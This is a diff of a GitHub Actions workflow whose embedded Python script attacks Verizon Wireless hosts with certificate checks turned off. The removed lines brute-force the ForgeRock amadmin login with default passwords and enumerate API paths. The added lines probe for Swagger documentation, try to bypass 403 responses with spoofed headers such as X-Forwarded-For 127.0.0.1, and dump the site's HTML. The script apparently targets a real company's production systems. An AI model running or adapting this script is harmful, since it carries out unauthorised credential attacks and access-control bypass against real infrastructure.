@@ -1,18 +1,18 @@
-name: EMAG Phase 4
+name: EMAG Phase 5
 on:
   workflow_dispatch:
   push:
     branches: [main]
 
 jobs:
-  phase4:
+  phase5:
     runs-on: ubuntu-latest
     timeout-minutes: 10
     steps:
-      - name: EMAG Phase 4
+      - name: EMAG Phase 5
         run: |
           python3 - << 'PYEOF'
-          import urllib.request, urllib.error, json, ssl, time, http.cookiejar
+          import urllib.request, urllib.error, json, ssl, time
           ctx = ssl.create_default_context()
           ctx.check_hostname = False
           ctx.verify_mode = ssl.CERT_NONE
@@ -20,7 +20,7 @@ jobs:
           BASE = "https://ess.emag.verizonwireless.com"
           AM = "https://mblogin.verizonwireless.com"
           
-          def req(method, url, data=None, headers=None, opener=None):
+          def req(method, url, data=None, headers=None):
               h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
               if headers: h.update(headers)
               if isinstance(data, dict): body = json.dumps(data).encode()
@@ -28,94 +28,61 @@ jobs:
               else: body = data
               rq = urllib.request.Request(url, data=body, headers=h, method=method)
               try:
-                  op = opener if opener else urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
+                  op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
                   with op.open(rq, timeout=12) as r:
                       ct = r.headers.get("Content-Type","")
-                      rb = r.read(4096).decode("utf-8", errors="replace")
-                      return r.status, ct, rb
+                      rb = r.read(8192).decode("utf-8", errors="replace")
+                      return r.status, ct, rb, dict(r.headers)
               except urllib.error.HTTPError as e:
                   ct = e.headers.get("Content-Type","")
-                  return e.code, ct, e.read(2048).decode("utf-8", errors="replace")
+                  return e.code, ct, e.read(2048).decode("utf-8", errors="replace"), dict(e.headers)
               except Exception as e:
-                  return 0, "", str(e)
+                  return 0, "", str(e), {}
           
-          print("=== ForgeRock amadmin brute force ===")
-          auth_url = AM + "/vzauth/json/realms/root/authenticate"
-          admin_creds = [
-              ("amadmin","changeit"), ("amadmin","admin"), ("amadmin","Admin1234!"),
-              ("amadmin","Admin@123"), ("amadmin","password"), ("amadmin","amadmin"),
-              ("admin","changeit"), ("admin","admin"), ("admin","Admin1234!"),
-              ("forgerock","changeit"), ("openam","changeit"),
-          ]
-          session_token = None
-          
-          for user, pwd in admin_creds:
-              cj = http.cookiejar.CookieJar()
-              opener = urllib.request.build_opener(
-                  urllib.request.HTTPSHandler(context=ctx),
-                  urllib.request.HTTPCookieProcessor(cj)
-              )
-              s, ct, b = req("POST", auth_url, "{}", {
-                  "Accept-API-Version": "resource=2.1, protocol=1.0",
-                  "Content-Type": "application/json"
-              }, opener)
-              if s != 200:
-                  print(f"ERR initial {user}: {s} {b[:50]}")
-                  continue
-              try:
-                  resp = json.loads(b)
-                  auth_id = resp.get("authId","")
-              except:
-                  print(f"ERR parse {user}: {b[:50]}")
-                  continue
-              payload = {
-                  "authId": auth_id,
-                  "callbacks": [
-                      {"type":"NameCallback","input":[{"name":"IDToken1","value":user}],"output":[{"name":"prompt","value":"User Name:"}]},
-                      {"type":"PasswordCallback","input":[{"name":"IDToken2","value":pwd}],"output":[{"name":"prompt","value":"Password:"}]}
-                  ]
-              }
-              s2, ct2, b2 = req("POST", auth_url, payload, {
-                  "Accept-API-Version": "resource=2.1, protocol=1.0",
-                  "Content-Type": "application/json"
-              }, opener)
-              if s2 == 200 and "tokenId" in b2:
-                  print(f"[SUCCESS] {user}:{pwd}")
-                  print(f"Response: {b2[:300]}")
-                  session_token = json.loads(b2).get("tokenId","")
-                  cookies_list = [(c.name, c.value) for c in cj]
-                  print(f"Session: {session_token[:60]}")
-                  print(f"Cookies: {cookies_list}")
-                  break
-              else:
-                  print(f"[FAIL] {user}:{pwd} -> {s2} {b2[:80]}")
-              time.sleep(0.3)
-          
-          print()
-          print("=== EMAG API paths ===")
-          api_paths = [
-              "/emag/api/messages", "/emag/api/reports", "/emag/api/contacts",
-              "/emag/api/campaigns", "/emag/api/senders", "/emag/api/accounts",
-              "/emag/api/templates", "/emag/api/groups", "/emag/api/users",
-              "/emag/api/keywords", "/emag/api/optouts", "/emag/api/schedules",
-              "/emag/api/inbound", "/emag/api/billing", "/emag/api/settings",
-              "/emag/api/profile", "/emag/api/numbers", "/emag/api/subaccounts",
-              "/emag/api/webhooks", "/emag/api/logs", "/emag/api/deliveries",
-              "/emag/api/stats", "/emag/api/balance", "/emag/api/senderId",
-          ]
-          for path in api_paths:
-              s, ct, b = req("GET", BASE + path)
+          print("=== EMAG Swagger/OpenAPI ===")
+          for path in [
+              "/emag/swagger-ui.html", "/emag/swagger-ui/",
+              "/emag/swagger-ui/index.html", "/emag/swagger",
+              "/emag/api-docs", "/emag/v2/api-docs", "/emag/v3/api-docs",
+              "/emag/openapi", "/emag/openapi.json", "/emag/openapi.yaml",
+              "/emag/swagger.json", "/emag/swagger.yaml",
+              "/emag/webjars/swagger-ui/",
+          ]:
+              s, ct, b, h = req("GET", BASE + path)
               is_html = "<html" in b[:50].lower()
-              if "json" in ct or not is_html:
-                  print(f"[{s}] {path}: {b[:120]}")
-              time.sleep(0.1)
+              if "json" in ct or "yaml" in ct or "swagger" in b[:100].lower() or not is_html:
+                  print(f"[{s}] {path} ({ct[:25]}): {b[:150]}")
           
           print()
-          print("=== POST/PUT on 403 endpoints ===")
-          for path in ["/emag/api/messages", "/emag/api/reports"]:
-              for method in ["POST","PUT","DELETE"]:
-                  s, ct, b = req(method, BASE + path, "{}")
-                  print(f"[{s}] {method} {path}: {b[:120]}")
+          print("=== 403 Headers Analysis ===")
+          s, ct, b, h = req("GET", BASE + "/emag/api/messages")
+          print(f"[{s}] Headers: {dict(list(h.items())[:10])}")
+          print(f"Body: {repr(b[:100])}")
+          
+          print()
+          print("=== 403 Bypass Attempts ===")
+          for hdrs_extra in [
+              {"X-Forwarded-For": "127.0.0.1"},
+              {"X-Real-IP": "127.0.0.1"},
+              {"X-Forwarded-Host": "localhost"},
+              {"X-Original-URL": "/"},
+              {"X-Custom-IP-Authorization": "127.0.0.1"},
+              {"X-Forwarded-For": "10.0.0.1"},
+              {"Accept": "*/*"},
+              {"Accept": "text/html,application/xhtml+xml"},
+          ]:
+              s, ct, b, h = req("GET", BASE + "/emag/api/messages", None, hdrs_extra)
+              is_html = "<html" in b[:50].lower()
+              if s != 403 or not is_html:
+                  print(f"[{s}] {hdrs_extra}: {b[:100]}")
+              else:
+                  print(f"[{s}] {list(hdrs_extra.keys())[0]}: same 403")
+          
+          print()
+          print("=== EMAG Full HTML source ===")
+          s, ct, b, h = req("GET", BASE + "/emag/")
+          print(f"[{s}] Full HTML ({len(b)} chars):")
+          print(b)
           
           print("DONE")
           PYEOF
